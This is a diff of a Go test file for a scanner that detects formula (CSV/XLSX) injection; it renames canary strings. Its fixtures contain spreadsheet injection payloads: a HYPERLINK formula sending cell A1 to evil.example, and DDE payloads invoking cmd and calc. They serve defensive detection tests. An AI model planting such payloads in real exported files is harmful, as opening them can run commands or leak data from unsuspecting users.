@@ -61,8 +61,8 @@ func TestCSV_Positive(t *testing.T) {
 		sev       severity.Severity
 		conf      severity.Confidence
 	}{
-		{"canary", "name,note\nalice,\"=vgo0123456789\"\n", severity.Medium, severity.Firm},
-		{"stored xss canary after tab", "name,note\nbob,\t=1+vig-sx-0123456789ab\n", severity.Medium, severity.Firm},
+		{"canary", "name,note\nalice,\"=vigolium0123456789\"\n", severity.Medium, severity.Firm},
+		{"stored xss canary after tab", "name,note\nbob,\t=1+vigolium-sx-0123456789ab\n", severity.Medium, severity.Firm},
 		{"hyperlink", "name,link\nx,\"=HYPERLINK(\"\"http://evil.example/?\"\"&A1,\"\"x\"\")\"\n", severity.Medium, severity.Tentative},
 		{"dde", "a,b\n1,=cmd|' /C calc'!A0\n", severity.Medium, severity.Tentative},
 		{"plus dde", "a,b\n1,+msexcel|'\\..\\calc'!A1\n", severity.Medium, severity.Tentative},
@@ -111,7 +111,7 @@ func TestXLSX(t *testing.T) {
 	t.Parallel()
 	head := "Content-Type: application/octet-stream\r\nContent-Disposition: attachment; filename=report.xlsx"
 
-	sev, conf, ok := scan(t, makeCtx("/r", head, xlsx(t, `<worksheet><sheetData><row><c r="A1"><f>HYPERLINK("http://x/vgo0123456789")</f></c></row></sheetData></worksheet>`)))
+	sev, conf, ok := scan(t, makeCtx("/r", head, xlsx(t, `<worksheet><sheetData><row><c r="A1"><f>HYPERLINK("http://x/vigolium0123456789")</f></c></row></sheetData></worksheet>`)))
 	require.True(t, ok)
 	assert.Equal(t, severity.Medium, sev)
 	assert.Equal(t, severity.Firm, conf)
